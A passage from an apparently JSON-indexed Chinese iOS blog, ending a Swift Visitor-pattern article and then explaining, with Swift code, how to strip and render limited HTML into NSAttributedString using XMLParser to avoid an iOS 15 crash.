MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject() ] // Do any additional setup after loading the view. }}extension ViewController: UITableViewDataSource { func numberOfSections(in tableView: UITableView) -&gt; Int { return 1 } func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int { return viewObjects.count } func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let viewObject = viewObjects[indexPath.row] let cellName = viewObject.accept(visitor: cellVisitor) let cell = tableView.dequeueReusableCell(withIdentifier: String(describing: cellName), for: indexPath) let cellConfiguratorVisitor = FeedCellConfiguratorVisitor(cell: cell) viewObject.accept(visitor: cellConfiguratorVisitor) return cell }}extension ViewController: UITableViewDelegate { func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let viewObject = viewObjects[indexPath.row] let cellHeightVisitor = FeedCellHeightVisitor() let cellHeight = viewObject.accept(visitor: cellHeightVisitor) ?? UITableView.automaticDimension return cellHeight }}結果 測試：符合單一職責原則，可針對每個操作器的每個資料單點進行測試 擴充維護：當需要支援新的 DataSource (ViewObject) 時只需在 Visitor 協議擴充一個開口，並在個別操作器 Visitor 上進行實現、需要抽離新操作器時，也只要 New 新的 Class 實現即可。 閱讀：只需瀏覽各操作器物件即可知道整個頁面各個 View 的組成邏輯完整專案Murmur…2022/07 思維低谷期中撰寫的文章，內容如有描述不周、錯誤敬請海納！延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Design Patterns 的實戰應用紀錄 Visitor Pattern in Swift (Share Object to XXX Example)有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 235 Total Views Last Statistics Date: 2025-01-19 | 152 Views on Medium. " }, { "title": "自行實現 iOS NSAttributedString HTML Render", "url": "/posts/a8c2d26cc734/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, html-parsing, html, markdown", "date": "2022-06-10 00:11:59 +0800", "snippet": "自行實現 iOS NSAttributedString HTML RenderiOS NSAttributedString DocumentType.html 的替代方案Photo by Florian Olivo[TL;DR] 2023/03/12重新使用其他方式開發了 「 ZMarkupParser HTML String 轉換 NSAttributedString 工具 」 ，技術細節...", "content": "自行實現 iOS NSAttributedString HTML RenderiOS NSAttributedString DocumentType.html 的替代方案Photo by Florian Olivo[TL;DR] 2023/03/12重新使用其他方式開發了 「 ZMarkupParser HTML String 轉換 NSAttributedString 工具 」 ，技術細節及開發故事請前往「 手工打造 HTML 解析器的那些事 」起源從去年 iOS 15 發佈以來，App 始終被一項 Crash 問題長年霸榜，從數據來看，近 90 天 (2022/03/11~2022/06/08) 一共造成 2.4K+ 次閃退、影響 1.4K+ 位使用者。 此大量閃退問題從數據上看，官方應該已在 iOS ≥ 15.2 後續的版本修復(或減少發生機率)，數據已呈現趨勢下降。最大宗受影響版本： iOS 15.0.X ~ iOS 15.X.X另外有發現 iOS 12、iOS 13 也有零星閃退數，所以此問題應該已存在許久，只是 iOS 15 前幾版發生的機率幾乎是 100%。閃退原因：&lt;compiler-generated&gt; line 2147483647 specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)NSAttributedString 在 init 時發生 Crashed: com.apple.main-thread EXC_BREAKPOINT 0x00000001de9d4e44 閃退問題。 亦有可能是操作的地方不在 Main Thread.重現方式：此問題大量橫空出世時，讓開發團隊想破腦袋；複測 Crash Log 上的點都沒問題，不清楚使用者是在什麼情況下發生的；直到有一次因緣巧合下我剛好切換成「省電模式」然後就觸發問題了! ! WTF ! ! !解答經過一番搜索發現網路上有許多相同案例，也從 App Developer Forums 找到最早的相同 閃退問題提問 ，並獲得來自 官方 的回答： 這是已知的 iOS Foundation Bug：自 iOS 12 就已存在 如要渲染複雜的、無使用上約束的 HTML：請使用 WKWebView 有渲染約束：可自行撰寫 HTML Parser &amp; Render 直接使用 Markdown 做為渲染約束：iOS ≥ 15 NSAttributedString 可 直接使用 Markdown 格式渲染文字 渲染約束 的意思是限定 App 端能支援的渲染格式，例如只支援 粗體 、斜體、 超連結 。補充. 渲染複雜的 HTML — 想製作文饒圖效果可與後端共同協調ㄧ個介面：{ \"content\":[ {\"type\":\"text\",\"value\":\"第1段純文字\"}, {\"type\":\"text\",\"value\":\"第2段純文字\"}, {\"type\":\"text\",\"value\":\"第3段純文字\"}, {\"type\":\"text\",\"value\":\"第4段純文字\"}, {\"type\":\"image\",\"src\":\"https://zhgchg.li/logo.png\",\"title\":\"ZhgChgLi\"}, {\"type\":\"text\",\"value\":\"第5段純文字\"} ]}可與 Markdown 組合加上支援文字渲染，或參考 Medium 做法：\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}意思是 code in text, and link in text, and ZhgChgLi, and bold, and I, only i 這段文字的:- 第 5 到第 7 字元要標示為 程式碼 (用`Text`格式包裝)- 第 18 到第 22 字元要標示為 連結 (用[Text](URL)格式包裝)- 第 50 到第 63 字元要標示為 粗體(用*Text*格式包裝)- 第 55 到第 69 字元要標示為 斜體(用_Text_格式包裝)有規範＆可描述的結構後，App 就能自行使用原生方式渲染，達到效能、使用體驗最佳化。 UITextView 做文饒圖的坑，可參考我之前的文章： iOS UITextView 文繞圖編輯器 (Swift)Why?在實踐解答之前我們先回歸探究問題本身，個人認為這個問題主因並非來自 Apple，官方的 Bug 只是這個問題的引爆點。問題主要來自 App 端被當成 Web 來進行渲染 ，優點是 Web 開發快速，同個 API Endpoint 可以不用區分 Client 都給 HTML、可以彈性渲染任何想呈現的內容；缺點是 HTML 並非 App 的常見接口、不能期望 App Engineer 懂 HTML、 效能極差 、只能在 Main Thread、開發階段無法預期結果、無法確認支援規格。再往上找問題，多半是原始需求無法確定、不能確定 App 需要支援哪些規格、為了求快，才導致直接使用 HTML 做為 App 與 Web 的接口。效能極差補充效能部分，實測直接使用 NSAttributedString DocumentType.html 與自行實現渲染的方式有 5~20 倍的速度差距。Better既然是 App 要用，更好的做法要以 App 開發方式為出發點，對 App 來說需求的調整成本比 Web 高很多；有效的 App 開發應該要基於有規格的迭代調整，當下需要確定能支援的規格，之後如果要改我們就安排時間擴充規格，無法快速的想改就改，可以減少溝通成本、增加工作效率。 確認需求範圍 確認支援的規格 確認接口規範 (Markdown/BBCode/…要繼續用 HTML 也行，但要是有約束的，例如只用 &lt;b&gt;/&lt;i&gt;/&lt;a&gt;/&lt;u&gt; ，要在程式 明確告知 開發者) 自行實現渲染機制 維護、迭代支援規格[2023/02/27 Updated] [TL;DR]:已更新做法，不使用 XMLParser，因容錯率為 0 :&lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; 以上三種有可能出現的情境 XMLParser 解析都會出錯直接 Throw Error 顯示空白。使用 XMLParser，HTML 字串必須完全符合 XML 規則，無法像瀏覽器或 NSAttributedString.DocumentType.html 容錯正常顯示。改使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。— —How?木已成舟，回歸正題，目前已用 HTML 在渲染 NSAttributedString 那我們該如何解決上述的閃退還有效能問題呢？Inspired byStrip HTML 去除 HTML在談 HTML Render 之前先談 Strip HTML，還是再提一次前文 Why? 章節所說的，App 哪裡會拿到 HTML、會拿到哪些 HTML 應該要在規格協定好；而不是 App 這邊「 可能 」會拿到 HTML，需要 Strip 掉。 套句之前主管的名言：這樣太瘋了吧？Option 1. NSAttributedStringlet data = \"&lt;div&gt;Text&lt;/div&gt;\".data(using: .unicode)!let attributed = try NSAttributedString(data: data, options: [.documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue], documentAttributes: nil)let string = attributed.string 使用 NSAttributedString Render HTML 然後再取 string 出來就會是乾淨的 String 了 問題同本章問題，iOS 15 容易閃退、效能不好、只能在 Main Thread 操作Option 2. RegexhtmlString = \"&lt;div&gt;Test&lt;/div&gt;\"htmlString.replacingOccurrences(of: \"&lt;[^&gt;]+&gt;\", with: \"\", options: .regularExpression, range: nil) 最簡單有效的方式 Regex 並不能保證完全正確 e.g &lt;p foo=\"&gt;now what?\"&gt;Paragraph&lt;/p&gt; 是合法的 HTML 但會 Strip 錯誤Option 3. XMLParser參考 SwiftRichString 的做法，使用 Foundation 中的 XMLParser 將 HTML 做為 XML 解析自行實現 HTML Parser &amp; Strip 功能。import UIKit// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLStripper: NSObject, XMLParserDelegate { private static let topTag = \"source\" private var xmlParser: XMLParser private(set) var storedString: String // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(string: String) throws { let xmlString = HTMLStripper.escapeWithUnicodeEntities(string) let xml = \"&lt;\\(HTMLStripper.topTag)&gt;\\(xmlString)&lt;/\\(HTMLStripper.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } self.xmlParser = XMLParser(data: data) self.storedString = \"\" super.init() xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self } /// Parse and generate attributed string. func parse() throws -&gt; String { guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLStripper.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return storedString } // MARK: XMLParserDelegate @objc func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() } @objc func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() } @objc func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) } // MARK: Support Private Methods func foundNewString() { if let currentString = currentString { storedString.append(currentString) self.currentString = nil } } // handle html entity / html hex // Perform string escaping to replace all characters which is not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}let test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let stripper = try HTMLStripper(string: test)print(try! stripper.parse())// 我同意提供個人身分證 字號／護照／居留證號碼，以供跨境物流方通關使用，並已了解跨境商品之物流需求使用 Foundation XML Parser 去處理 String，實現 XMLParserDelegate 用 currentString 存放 String，因 String 有時會拆成多個 String 所以 foundCharacters 是有機會被重複呼叫的， didStartElement 、 didEndElement 找到字串開始時、結束時，將當前結果存下並清空 currentString 。 優點是會連帶轉換 HTML Entity to 實際字元 e.g. &amp;#103; -&gt; g 優點是實現複雜、遇到不合規格的 HTML 會 XMLParser 失敗 e.g. &lt;br&gt; 忘了寫成 &lt;br/&gt; 個人認為單純要 Strip HTML Option 2. 是比較好的方法 ，會介紹此方法是因為 Render HTML 也是使用相同原理，先用這個做為簡單範例 :)HTML Render w/XMLParser使用 XMLParser 自行實現，同 Strip 原理，我們可以多加上剖析到什麼 Tag 時要做對應的渲染方式。需求規格： 支援擴充想剖析的 Tag 支援設定 Tag Default Style e.g &lt;a&gt; Tag 套用連結樣式 支援剖析 style Attributed，因 HTML 會在 style=\"color:red\" 上去明示要顯示的樣式 樣式支援更改文字粗細、大小、底線、行距、字距、背景顏色、字顏色 不支援 Image Tag、Table Tag…等較複雜 TAG 大家可依照自己的規格需求去刪減功能，例如不需支援背景顏色調整，則不需要開出可設定背景顏色的口。 本文只是概念實現， 並非架構上的 Best Practice ；如有明確規格、使用方式，可考慮套用些 Design Pattern 來實現，達成好維護好擴充。⚠️⚠️⚠️ Attention ⚠️⚠️⚠️再次提醒， 如果你的 App 是全新的或有機會直接全改成 Markdown 格式，建議還是採用以上方式，本篇自行撰寫 Render 太複雜且效能不會比 Markdown 好 。 即使你是 iOS &lt; 15 不支援原生 Markdown，還是可以在 Github 上找到 大神做好的 Markdown Parser 方案 。HTMLTagParserprotocol HTMLTagParser { static var tag: String { get } // 宣告想解析的 Tag Name, e.g. a var storedHTMLAttributes: [String: String]? { get set } // Attributed 解析結果將存放於此, e.g. href,style var style: AttributedStringStyle? { get } // 此 Tag 想套用的樣式 func render(attributedString: inout NSMutableAttributedString) // 實現渲染 HTML to attributedString 的邏輯}宣告可剖析的 HTML Tag 實體，方便擴充管理。AttributedStringStyleprotocol AttributedStringStyle { var font: UIFont? { get set } var color: UIColor? { get set } var backgroundColor: UIColor? { get set } var wordSpacing: CGFloat? { get set } var paragraphStyle: NSParagraphStyle? { get set } var customs: [NSAttributedString.Key: Any]? { get set } // 萬能設定口，建議確定可支援規格後將其抽象出來，並關閉此開口 func render(attributedString: inout NSMutableAttributedString)}// abstract implementextension AttributedStringStyle { func render(attributedString: inout NSMutableAttributedString) { let range = NSMakeRange(0, attributedString.length) if let font = font { attributedString.addAttribute(NSAttributedString.Key.font, value: font, range: range) } if let color = color { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) } if let backgroundColor = backgroundColor { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: backgroundColor, range: range) } if let wordSpacing = wordSpacing { attributedString.addAttribute(NSAttributedString.Key.kern, value: wordSpacing as Any, range: range) } if let paragraphStyle = paragraphStyle { attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) } if let customAttributes = customs { attributedString.addAttributes(customAttributes, range: range) } }}宣告 Tag 可供設定的樣式。HTMLStyleAttributedParser// only support tag attributed down below// can set color,font seize,line height,word spacing,background colorenum HTMLStyleAttributedParser: String { case color = \"color\" case fontSize = \"font-size\" case lineHeight = \"line-height\" case wordSpacing = \"word-spacing\" case backgroundColor = \"background-color\" func render(attributedString: inout NSMutableAttributedString, value: String) -&gt; Bool { let range = NSMakeRange(0, attributedString.length) switch self { case .color: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) return true } case .backgroundColor: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: color, range: range) return true } case .fontSize: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.font, value: UIFont.systemFont(ofSize: CGFloat(size)), range: range) return true } case .lineHeight: if let size = convertToiOSSize(value) { let paragraphStyle = NSMutableParagraphStyle() paragraphStyle.lineSpacing = size attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) return true } case .wordSpacing: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.kern, value: size, range: range) return true } } return false } // convert 36px -&gt; 36 private func convertToiOSSize(_ string: String) -&gt; CGFloat? { guard let regex = try? NSRegularExpression(pattern: \"^([0-9]+)\"), let firstMatch = regex.firstMatch(in: string, options: [], range: NSRange(location: 0, length: string.utf16.count)), let range = Range(firstMatch.range, in: string), let size = Float(String(string[range])) else { return nil } return CGFloat(size) } // convert html hex color #ffffff to UIKit Color private func convertToiOSColor(_ hexString: String) -&gt; UIColor? { var cString: String = hexString.trimmingCharacters(in: .whitespacesAndNewlines).uppercased() if cString.hasPrefix(\"#\") { cString.remove(at: cString.startIndex) } if (cString.count) != 6 { return nil } var rgbValue: UInt64 = 0 Scanner(string: cString).scanHexInt64(&amp;rgbValue) return UIColor( red: CGFloat((rgbValue &amp; 0xFF0000) &gt;&gt; 16) / 255.0, green: CGFloat((rgbValue &amp; 0x00FF00) &gt;&gt; 8) / 255.0, blue: CGFloat(rgbValue &amp; 0x0000FF) / 255.0, alpha: CGFloat(1.0) ) }}實現 Style Attributed Parser 解析 style=\"color:red;font-size:16px\" 但 CSS Style 有非常多可設定樣式，所以需要列舉可支援範圍。extension HTMLTagParser { func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) } func defaultStyleRender(attributedString: inout NSMutableAttributedString) { // setup default style to NSMutableAttributedString style?.render(attributedString: &amp;attributedString) // setup &amp; override HTML style (style=\"color:red;background-color:black\") to NSMutableAttributedString if is exists // any html tag can have style attribute if let style = storedHTMLAttributes?[\"style\"] { let styles = style.split(separator: \";\").map { $0.split(separator: \":\") }.filter { $0.count == 2 } for style in styles { let key = String(style[0]) let value = String(style[1]) if let styleAttributed = HTMLStyleAttributedParser(rawValue: key), styleAttributed.render(attributedString: &amp;attributedString, value: value) { print(\"Unsupport style attributed or value[\\(key):\\(value)]\") } } } }}套用 HTMLStyleAttributedParser &amp; HTMLStyleAttributedParser 抽象實現。一些 Tag Parser &amp; AttributedStringStyle 的實現範例struct LinkStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14) var color: UIColor? = UIColor.blue var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct ATagParser: HTMLTagParser { // &lt;a&gt;&lt;/a&gt; static let tag: String = \"a\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = LinkStyle() func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) if let href = storedHTMLAttributes?[\"href\"], let url = URL(string: href) { let range = NSMakeRange(0, attributedString.length) attributedString.addAttribute(NSAttributedString.Key.link, value: url, range: range) } }}struct BoldStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14, weight: .bold) var color: UIColor? = UIColor.black var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct BoldTagParser: HTMLTagParser { // &lt;b&gt;&lt;/b&gt; static let tag: String = \"b\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = BoldStyle()}HTMLToAttributedStringParser: XMLParserDelegate 核心實現// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLToAttributedStringParser: NSObject { private static let topTag = \"source\" private var xmlParser: XMLParser? private(set) var attributedString: NSMutableAttributedString = NSMutableAttributedString() private(set) var supportedTagRenders: [HTMLTagParser] = [] private let defaultStyle: AttributedStringStyle /// Styles applied at each fragment. private var renderingTagRenders: [HTMLTagParser] = [] // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(defaultStyle: AttributedStringStyle) { self.defaultStyle = defaultStyle super.init() } func register(_ tagRender: HTMLTagParser) { if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == type(of: tagRender).tag }) { supportedTagRenders.remove(at: index) } supportedTagRenders.append(tagRender) } /// Parse and generate attributed string. func parse(string: String) throws -&gt; NSAttributedString { var xmlString = HTMLToAttributedStringParser.escapeWithUnicodeEntities(string) // make sure &lt;br/&gt; format is correct XML // because Web may use &lt;br&gt; to present &lt;br/&gt;, but &lt;br&gt; is not a vaild XML xmlString = xmlString.replacingOccurrences(of: \"&lt;br&gt;\", with: \"&lt;br/&gt;\") let xml = \"&lt;\\(HTMLToAttributedStringParser.topTag)&gt;\\(xmlString)&lt;/\\(HTMLToAttributedStringParser.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } let xmlParser = XMLParser(data: data) xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self self.xmlParser = xmlParser attributedString = NSMutableAttributedString() guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLToAttributedStringParser.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return attributedString }}// MARK: Private Methodprivate extension HTMLToAttributedStringParser { func enter(element elementName: String, attributes: [String: String]) { // elementName = tagName, EX: a,span,div... guard elementName != HTMLToAttributedStringParser.topTag else { return } if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == elementName }) { var tagRender = supportedTagRenders[index] tagRender.storedHTMLAttributes = attributes renderingTagRenders.append(tagRender) } } func exit(element elementName: String) { if !renderingTagRenders.isEmpty { renderingTagRenders.removeLast() } } func foundNewString() { if let currentString = currentString { // currentString != nil ,ex: &lt;i&gt;currentString&lt;/i&gt; var newAttributedString = NSMutableAttributedString(string: currentString) if !renderingTagRenders.isEmpty { for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } } else { defaultStyle.render(attributedString: &amp;newAttributedString) } attributedString.append(newAttributedString) self.currentString = nil } else { // currentString == nil ,ex: &lt;br/&gt; var newAttributedString = NSMutableAttributedString() for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } attributedString.append(newAttributedString) } }}// MARK: Helperextension HTMLToAttributedStringParser { // handle html entity / html hex // Perform string escaping to replace all characters which is not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}// MARK: XMLParserDelegateextension HTMLToAttributedStringParser: XMLParserDelegate { func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() enter(element: elementName, attributes: attributeDict) } func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() guard elementName != HTMLToAttributedStringParser.topTag else { return } exit(element: elementName) } func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) }}套用 Strip 的邏輯，我們可以幫拆好的架構在其中進行組合從 elementName 知道當前的 Tag 並套用相應的 Tag Parser 及套上定義好的 Style。Test Resultlet test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let render = HTMLToAttributedStringParser(defaultStyle: DefaultTextStyle())render.register(ATagParser())render.register(BoldTagParser())render.register(SpanTagParser())//...print(try! render.parse(string: test))// Result:// 我{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }同意{// NSColor = \"UIExtendedSRGBColorSpace 0 0 1 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSLink = \"http://google.com\";// NSUnderline = 1;// }提供{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }個{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Bold 14.00 pt. P [] (0x13a013870) fobj=0x13a013870, spc=3.46\\\"\";// NSUnderline = 1;// }人身分證字號／護照／居留{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }證號碼{// NSColor = \"UIExtendedSRGBColorSpace 1 0 0 1\";// NSFont = \"\\\".SFNS-Regular 20.00 pt. P [] (0x13a015fa0) fobj=0x13a015fa0, spc=4.82\\\"\";// NSKern = 10;// NSParagraphStyle = \"Alignment 4, LineSpacing 10, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }，以供跨境物流方通關{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, 